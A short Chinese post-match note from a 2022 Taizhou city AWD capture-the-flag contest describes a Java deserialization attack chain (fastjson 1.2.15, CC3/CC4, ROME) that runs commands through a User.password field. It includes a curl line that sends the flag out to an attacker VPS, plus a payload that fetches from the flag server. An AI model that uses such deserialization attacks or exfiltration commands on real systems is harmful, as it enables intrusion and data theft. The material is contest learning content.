# 2022 台州市赛线上 AWD 赛后小记

> 赛事：台州市赛 2022 2022 | 方向：web | 难度：medium | 工具：Java、PHP、curl

## 一句话总结

Java AWD：User.password 触发命令执行，fastjson+CC3/4+ROME 链外带 flag。

## 攻击链

1. ROOT.war 部署小米商城（User 实体 readObject）
2. Cookie cuser 反序列化入口
3. fastjson 1.2.15 + CC3 + CC4 + ROME 依赖
4. User.password 字段被当命令直接执行
5. 拿 fastjson-local-echo 工具做盲打回显
6. flagserver 43.136.168.189 拿 flag 写环境变量
7. curl vps:2333?flag=$flag 外带 flag
8. 4h 24 轮 10min/轮 Java+PHP 攻陷 +10 被攻陷 -15

## 关键 payload

```
flag=`curl http://43.136.168.189/index.php?token=3665_USR-20221125-6uv1t`
```

## 经验教训

Java AWD 优先找 readObject 入口；fastjson-local-echo 是不出网时的盲打回显神器。
